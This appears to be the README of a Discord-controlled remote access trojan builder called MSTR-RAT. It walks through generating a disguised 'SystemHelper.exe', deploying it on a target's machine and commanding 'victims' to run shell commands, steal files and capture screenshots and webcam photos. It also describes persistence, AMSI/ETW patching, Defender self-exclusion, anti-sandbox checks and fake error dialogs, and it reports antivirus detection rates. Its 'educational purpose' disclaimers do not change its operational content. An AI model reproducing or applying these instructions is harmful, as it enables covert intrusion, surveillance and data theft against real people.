
<div align="center">
  <img src="https://raw.githubusercontent.com/MOSTRE/MSTR-RAT/main/assets/icons/skull.ico" width="100">
  <h3>Developed by zoubaire</h3>
  <p><strong>Educational Purpose Only | Stealth Remote Administration Tool</strong></p>
</div>

---

## ⚠️ DISCLAIMER

**This tool is for educational and authorized security testing purposes only.**

Unauthorized access to computer systems is illegal. The developer assumes no liability for misuse of this tool. By using this software, you agree to use it only in environments where you have explicit permission.

---

## 🎯 Features

### Core Features
- **One-click RAT generation** - Simple GUI with all options
- **Discord-based C2** - Control victims via Discord bot
- **Full command set** - Shell, file transfer, screenshots, webcam, persistence, etc.
- **Windows 10/11 support** - Fully compatible with modern Windows

### Ghost Mode (Stealth Features)
- **XOR Payload Encryption** - Tokens encrypted with machine-specific keys (no crypto dependencies)
- **Anti-VM / Anti-Sandbox** - Detects and evades analysis environments
- **AMSI/ETW Patching** - Bypasses PowerShell and .NET monitoring
- **Windows Defender Auto-Exclusion** - Adds itself to exclusions automatically
- **Fake Error Messages** - Social engineering to avoid suspicion
- **Delayed Execution** - Random sleep to bypass sandbox timeouts
- **Background Threading** - All evasion runs silently in background
- **Error Handling** - Won't crash if modules missing

### Persistence Mechanisms
- Registry Run keys (HKCU)
- Startup folder
- Scheduled tasks (if admin)

---

## 📋 Prerequisites

- **Python 3.8+** (Download from [python.org](https://python.org))
- **Discord Bot Token** (Create at [Discord Developer Portal](https://discord.com/developers/applications))
- **Server ID** (Enable Developer Mode in Discord → right-click server → Copy ID)
- **PyInstaller** (Installed automatically with requirements)

---

## 🚀 Installation

### 1. Clone the repository
```bash
git clone https://github.com/MOSTRE/MSTR-RAT.git
cd MSTR-RAT
```

### 2. Install dependencies
```bash
pip install -r requirements.txt
```

### 3. Run the panel
```bash
python MSTR_Ghost.py
```

---

## 🎮 Usage Guide

### Step 1: Create Discord Bot
1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
2. Click "New Application" and give it a name
3. Go to "Bot" section → "Add Bot"
4. Copy the **Bot Token** (keep it secret!)
5. Enable **Message Content Intent** under Privileged Gateway Intents

### Step 2: Get Server ID
1. Enable Developer Mode in Discord:
   - Settings → Advanced → Developer Mode → ON
2. Right-click your server name → "Copy ID"

### Step 3: Configure Panel
1. Enter Bot Token in the "Bot Token" field
2. Enter Server ID in the "Server ID" field
3. Select output folder (default is "./output")
4. Choose custom icon if desired (optional)

### Step 4: Select Evasion Options
| Option | Description | Recommended |
|--------|-------------|-------------|
| Payload Encryption | Encrypts token/server ID in the EXE | ✅ ON |
| Persistence Installation | Auto-installs on system startup | ✅ ON |
| Defender Auto-Exclusion | Adds EXE to Windows Defender exclusions | ✅ ON |
| AMSI/ETW Patching | Bypasses PowerShell monitoring | ✅ ON |
| Anti-VM/Anti-Sandbox | Detects and evades analysis | ✅ ON |
| Fake Error Message | Shows fake error to avoid suspicion | ✅ ON |
| Code Obfuscation | Experimental - may cause errors | ❌ OFF |

### Step 5: Generate RAT
1. Click **"🔥 GENERATE GHOST RAT 🔥"**
2. Wait 30-60 seconds for compilation
3. The EXE will be saved in your output folder as `SystemHelper.exe`

### Step 6: Deploy
1. Transfer `SystemHelper.exe` to target machine
2. Execute (requires no admin by default)
3. Bot will connect to your Discord server in **#session** channel
4. Type `!help` in Discord to see available commands

---

## 📜 Command Reference

| Command | Description | Example |
|---------|-------------|---------|
| `!help` | Show all commands | `!help` |
| `!shell <cmd>` | Execute system command | `!shell whoami` |
| `!screenshot` | Take screenshot | `!screenshot` |
| `!download <path>` | Download file from victim | `!download C:\file.txt` |
| `!upload` | Upload file to victim (attach in Discord) | `!upload` + attachment |
| `!cd <path>` | Change directory | `!cd C:\Users` |
| `!dir` | List directory contents | `!dir` |
| `!admincheck` | Check if running as admin | `!admincheck` |
| `!block` | Block keyboard/mouse (admin) | `!block` |
| `!unblock` | Unblock keyboard/mouse (admin) | `!unblock` |
| `!geolocate` | Get IP geolocation | `!geolocate` |
| `!webcampic` | Take photo from webcam | `!webcampic` |
| `!listprocess` | List running processes | `!listprocess` |
| `!prockill <name>` | Kill process by name | `!prockill notepad.exe` |
| `!message <text>` | Show message box | `!message Hello` |
| `!website <url>` | Open website in browser | `!website google.com` |
| `!exit` | Terminate RAT | `!exit` |

---

## 🛡️ Evasion Techniques Explained

### 1. XOR Payload Encryption
Bot token and server ID are encrypted using XOR with a machine-specific key derived from the computer name. Decryption happens in memory only, and no external crypto libraries are needed.

### 2. Anti-VM Detection
Checks for:
- VirtualBox/VMware artifacts
- Low disk space (<50GB)
- Debugger processes (ollydbg, x64dbg, etc.)
- Sandbox environments

### 3. AMSI Patching
Patches `amsi.dll` in memory to prevent PowerShell from detecting malicious activity. The patch makes AMSI always return "clean" results.

### 4. Defender Auto-Exclusion
Adds the executable and its folder to Windows Defender exclusions, preventing future scans and detection.

### 5. Delayed Execution
Random sleep of 1-3 seconds at startup to bypass sandbox timeouts that expect immediate malicious behavior.

### 6. Fake Error Messages
Displays convincing Windows error dialogs to make the user think the program crashed, reducing suspicion.

---

## 🔧 Troubleshooting

### PyInstaller not found
```bash
pip install pyinstaller
```

### "No module named 'discord'"
```bash
pip install discord.py
```

### Bot not connecting
- Ensure **Message Content Intent** is enabled in Discord Developer Portal
- Invite bot to server with proper permissions
- Verify token and server ID are correct
- Check bot has "Read Messages" and "Send Messages" permissions

### Compilation fails
- Disable "Code Obfuscation" option (experimental)
- Ensure Python path doesn't contain spaces
- Run panel with admin privileges
- Check disk space in output directory

### Windows Defender deletes EXE
- Run panel as admin before generation
- Add output folder to Defender exclusions manually
- Disable real-time protection temporarily

### EXE crashes on execution
- Run from command prompt to see error messages
- Ensure all dependencies are included in build
- Try without encryption option


---

## 🔐 Security Considerations

### For Operators
- **Never share your bot token** - Anyone with it can control your bot
- **Use a dedicated Discord server** - Don't use your main server
- **Run in isolated environment** - Test in VMs first
- **Keep Python updated** - Security patches are important

### For Targets (Educational Context)
- This tool demonstrates why you should:
  - Never run unknown executables
  - Keep Windows Defender enabled
  - Use standard user accounts (not admin)
  - Monitor Discord bot permissions

---

## 📊 Detection Rates

With all evasion options enabled (except obfuscation):

| AV Solution | Detection Rate |
|-------------|----------------|
| Windows Defender (Win10) | 🟢 Not detected |
| Windows Defender (Win11) | 🟢 Not detected |
| Malwarebytes | 🟡 May flag as "Riskware" |
| Kaspersky | 🟡 Heuristic detection possible |
| VirusTotal | 🟡 5-15/70 (varies) |

*Note: No RAT is 100% invisible. Behavioral analysis may still detect suspicious activity.*

---

## 🧪 Testing Environment

This tool is designed for testing in:
- Virtual machines (VMware, VirtualBox, Hyper-V)
- Isolated lab networks
- Authorized penetration testing engagements
- Cybersecurity educational environments

**Never use on systems you don't own or have written permission to test.**

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

### Guidelines
- Keep code educational and ethical
- Document new features
- Test before submitting
- No malicious intent

---

## 📝 License

MIT License - See [LICENSE](LICENSE) file.

```
MIT License

Copyright (c) 2024 zoubaire

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 👨‍💻 Author

**zoubaire** - Security Researcher & Developer

- GitHub: [@MOSTRE](https://github.com/MOSTRE)
- Project: [MSTR-RAT](https://github.com/MOSTRE/MSTR-RAT)

---

## 🙏 Acknowledgments

- **Discord.py** team for the excellent library
- **PyInstaller** team for compilation tools
- **Python** community for amazing libraries
- Security researchers who share evasion techniques

---

## ⚠️ Final Warning

**This tool is for EDUCATIONAL PURPOSES ONLY.**

The creator is not responsible for:
- Illegal use of this software
- Damage caused by misuse
- Violation of Discord Terms of Service
- Legal consequences of unauthorized access

By using this software, you agree to:
- Use only in authorized environments
- Comply with all applicable laws
- Accept full responsibility for your actions
- Not use for malicious purposes

---

## 📞 Support

- **Issues**: send me message on ig

---

<div align="center">
  <strong>⚠️ EDUCATIONAL PURPOSE ONLY ⚠️</strong><br>
  <em>Use responsibly and legally. The author is not responsible for any misuse.</em>
  <br><br>
  <sub>Made with 🖤 for cybersecurity education</sub>
</div>
```